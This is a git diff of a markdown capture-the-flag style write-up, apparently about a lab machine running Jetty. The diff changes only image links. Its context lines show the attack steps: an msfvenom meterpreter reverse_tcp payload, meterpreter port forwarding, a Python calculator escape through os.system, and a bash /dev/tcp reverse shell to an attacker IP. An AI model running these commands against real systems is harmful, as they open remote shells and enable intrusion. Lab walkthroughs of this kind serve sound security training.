@@ -12,7 +12,7 @@ image:
   height: 500
 ---
 
-![info](https://imgur.com/Yfejewk)
+![image](https://user-images.githubusercontent.com/67085453/143765891-34e88ab8-1881-47a1-90de-e588c3eea925.png)<br>
 
 **> Information Gathering**<br>
 Started with the usual nmap scan and from the scan we can see active ports. port 22 (ssh) & port 30609 (jetty 9.4.27).<br>
@@ -50,27 +50,27 @@ String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(tru
 
 **> Post Exploitation**<br>
 After i got a shell, post enumeration phase begins. I transfered linpeas to the target, changer permissions and executed linpeas. In linpeas output, i found a port binded to the _loopback address(127.0.0.1:8080)_.<br>
-![lo address](https://imgur.com/pGmvFM4)<br> 
+![image](https://user-images.githubusercontent.com/67085453/143765907-412f03af-7170-4dc5-b840-ee0835a53718.png)<br> 
 
 Port 8080 is mostly used for web services. To confirm, i tried `wget` on the ort since `curl` is not found on the target.<br>
-![lo address](https://imgur.com/0hk2eI3)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765930-93ced860-08cc-4b92-827d-24a5ff158593.png)<br>
 
 Reading the fetched `index.html` from port 8080 indicates that there is a web webapp running internally.<br>
-![contents index](https://imgur.com/t2gkbU0)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765946-d1c2a430-0af0-49ab-b1fd-83f18ddc019c.png)<br>
 
 To access this internal web service, we have to port-forward port 8080 from the target to our attacking machine. To do this, i created a linux payload using `msfvenom`. <br>
 ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=9002 -f elf -o 9002msf``<br>
-![msfvenom](https://imgur.com/ucnPApI)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765952-d511e7e9-e049-4a7a-9360-38e69b2548d4.png)<br>
 
 The next thing to do is to transfer the payload to the target and execute it while msfconsole is listerning fortrt incoming connections.<br>
-![payload transfer](https://imgur.com/N10E0gV)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765957-aa29bf3e-872b-4760-b63b-ffedb1e21e22.png)<br>
 
 When the payload is executed on the target, we should recieve a connection back on `msfconsole`. Once the connection is in, we can port-forward the target intertnal port `8080` to our attacking machine using the `portfwd`command in msfconsole<br>
 `portfwd add -l 8080 -p 8080 -r 127.0.0.1`<br>
-![msfshell portfwd](https://imgur.com/hZfURL1)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765963-00518744-c295-44f9-820a-9db9a7dcfcbf.png)<br>
 
 Now that we the target port `8080` connected back to our attacking machine, wehn visited, we found a python maths console.<br>
-![internal web](https://imgur.com/fqWLB5U)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765968-cf05e59b-727e-4377-ac76-ba25ed07ce10.png)<br>
 
 Since it's a simple python maths calculator, we can easily bypasss the pythin functions and gain a remote code execution. To do this, we will use `__import__("os").system("")`<br>
 
@@ -83,4 +83,4 @@ bash -c  'bash -i&/dev/tcp/10.66.66.78/9002 0>&1'
 
 Once our bash file is on the target, we can execute the bash file using the pythin calculator. We simply do this using the command
 `__import__("os").system("/bin/bash /tmp/shell.sh")`<br>
-![root-shell](https://imgur.com/3MnjYsn)
+![image](https://user-images.githubusercontent.com/67085453/143765976-251cd43b-7e6d-4852-895b-6b2ba81033c9.png)
